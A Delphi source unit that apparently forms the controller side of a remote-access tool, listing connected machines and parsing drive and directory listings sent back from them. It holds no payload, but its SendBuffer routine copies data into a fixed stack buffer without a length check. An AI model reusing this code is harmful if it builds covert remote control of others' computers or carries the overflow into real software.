unit untClientObject;

interface

uses
  System.Win.ScktComp,
  Windows,
  Sysutils,
  CLasses,
  ComCtrls,
  untUtil,
  untCommands;

type
  TClientThread = class(TObject)
  private
    procedure ParsePacket(mBuff:Pointer; dwLen:Integer; bCMD:Byte);
  protected
  public
    Data:AnsiString;
    mySocket:TCustomWinsocket;
    lstItem:TListItem;
    frmControl:TObject;
    constructor Create(CreateSuspended: Boolean);
    procedure Cleanup;
    procedure ReadData;
    function SendBuffer(bySocketCmd: Byte; lpszBuffer: Pointer; iBufferLen: Integer): Boolean;
  end;
implementation

uses Unit1, untControl, untFilemanager;

procedure TClientThread.ParsePacket(mBuff:Pointer; dwLen:Integer; bCMD:Byte);
var
  lstTokens:TStringList;
  tempGUIString:String;
begin
  case bCMD of
    CMD_ONLINE:
      begin
        SetString(tempGUIString, PChar(mBuff), dwLen div 2);
        lstTokens := Explode('|', tempGUIString);
        if lstTokens.Count >= 2 then
        begin
          if not Assigned(Self.lstItem) then
          begin
            lstItem := Form1.Listview1.Items.Add;
            lstItem.Caption := mySocket.RemoteAddress;
            lstItem.ImageIndex := 0;
            lstItem.SubItems.Add(lstTokens[0]);
            lstItem.SubItems.Add(lstTokens[1]);
            lstItem.SubItems.Objects[0] := Self;
          end;
        end else begin
          mysocket.Close;
          exit;
        end;
      end;
    CMD_DRIVE_LIST:
      begin
        SetString(tempGUIString, PChar(mBuff), dwLen div 2);
        if Assigned(Self.frmControl) then
        begin
          TForm2(TForm3(Self.frmControl).frmFilemanager).ProcessCommand(bCMD, tempGUIString);
        end;
      end;
    CMD_LIST_DIR_START:
      begin
        tempGUIString := '';
        if Assigned(Self.frmControl) then
        begin
          TForm2(TForm3(Self.frmControl).frmFilemanager).ProcessCommand(bCMD, tempGUIString);
        end;
      end;
    CMD_LIST_DIR_WRITE:
      begin
        SetString(tempGUIString, PChar(mBuff), dwLen div 2);
        if Assigned(Self.frmControl) then
        begin
          TForm2(TForm3(Self.frmControl).frmFilemanager).ProcessCommand(bCMD, tempGUIString);
        end;
      end;
    CMD_LIST_DIR_FINISHED:
      begin
        tempGUIString := '';
        if Assigned(Self.frmControl) then
        begin
          TForm2(TForm3(Self.frmControl).frmFilemanager).ProcessCommand(bCMD, tempGUIString);
        end;
      end;
    CMD_LIST_DIR_ERROR:
      begin
        tempGUIString := '';
        if Assigned(Self.frmControl) then
        begin
          TForm2(TForm3(Self.frmControl).frmFilemanager).ProcessCommand(bCMD, tempGUIString);
        end;
      end;
  end;
end;

function TClientThread.SendBuffer(bySocketCmd: Byte; lpszBuffer: Pointer; iBufferLen: Integer): Boolean;
var
  lpszSendBuffer: Pointer;
  szSendBuffer: Array[0..2047] Of WideChar;
  iSendLen: Integer;
begin
  Result := False;
  ZeroMemory(@szSendBuffer, SizeOf(szSendBuffer));
  lpszSendBuffer := Pointer(DWORD(@szSendBuffer) + SizeOf(TSocketHeader));
  if ((iBufferLen > 0) and (lpszBuffer <> nil)) then
  begin
    CopyMemory(lpszSendBuffer, lpszBuffer, iBufferLen);
  end;
  with LPSocketHeader(@szSendBuffer)^ do
  begin
    dwPacketLen := iBufferLen;
    bCommand := bySocketCmd;
  end;
  Dec(DWORD(lpszSendBuffer));
  iBufferLen := iBufferLen + SizeOf(TSocketHeader);
  iSendLen := Self.mySocket.SendBuf(szSendBuffer, iBufferLen);
  if (iSendLen = iBufferLen) then
    Result := True;
  Sleep(0);
end;

procedure TClientThread.Cleanup;
begin
  if Assigned(lstItem) then
    lstItem.Delete;

  if Assigned(frmControl) then
    frmControl.Free;
end;

constructor TClientThread.Create;
begin
  mySocket := nil;
  frmControl := nil;
end;

procedure TClientThread.ReadData();
var
  DataSize, dwBuffLen: Cardinal;
  mData:AnsiString;
  bByte:Byte;
  pSocketHeader:LPSocketHeader;
begin
  if mySocket = nil then exit;
  if mySocket.Data = nil then exit;

  if Data = '' then exit;
  pSocketHeader := @Data[1];
  DataSize := pSocketHeader.dwPacketLen;
  bByte := pSocketHeader.bCommand;
  dwBuffLen := Length(Data) - SizeOf(TSocketHeader);
  Outputdebugstring(PChar('-------------------'));
  Outputdebugstring(PChar('ReadData() called'));
  Outputdebugstring(PChar('Datasize: ' + inttostr(DataSize)));
  Outputdebugstring(PChar('dwBuffLen: ' + inttostr(dwBuffLen)));
  if DataSize > dwBuffLen then exit;
  Delete(Data,1, SizeOf(TSocketHeader));
  mData := Copy(Data,1,DataSize);
  Delete(Data,1, DataSize);
  //Dec(DataSize);
  Outputdebugstring(PChar('New Packet!'));
  Outputdebugstring(PChar('mData: ' + mData));
  ParsePacket(@mData[1], DataSize, bByte);
  if Length(Data) > 0 then begin
    ReadData;
  end;
end;
end.
